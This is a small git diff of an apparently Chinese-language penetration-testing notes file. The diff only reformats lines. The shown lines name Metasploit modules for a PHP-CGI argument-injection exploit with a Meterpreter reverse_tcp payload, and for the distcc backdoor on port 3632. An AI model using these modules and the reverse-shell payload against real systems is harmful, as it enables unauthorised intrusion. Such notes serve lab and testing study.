@@ -47,12 +47,12 @@ cd rootfs 进入root目录
 cat /*
 ```
 ## Metasploit利用php_cgi漏洞 ##
-**Dir:**cgi-bin
-**Exploit:**exploit/multi/php_cgi_arg_injection
-**Payload:**
+**Dir:**cgi-bin   
+**Exploit:**exploit/multi/php_cgi_arg_injection   
+**Payload:**   
 ```
 set PAYLOAD /php/meterpreter/reverse_tcp
 ```
 ## Distcc后门漏洞 ##
-**Port:**3632
-**Exploit:**use exploit/unix/misc/distcc_exec
+**Port:**3632   
+**Exploit:**use exploit/unix/misc/distcc_exec   
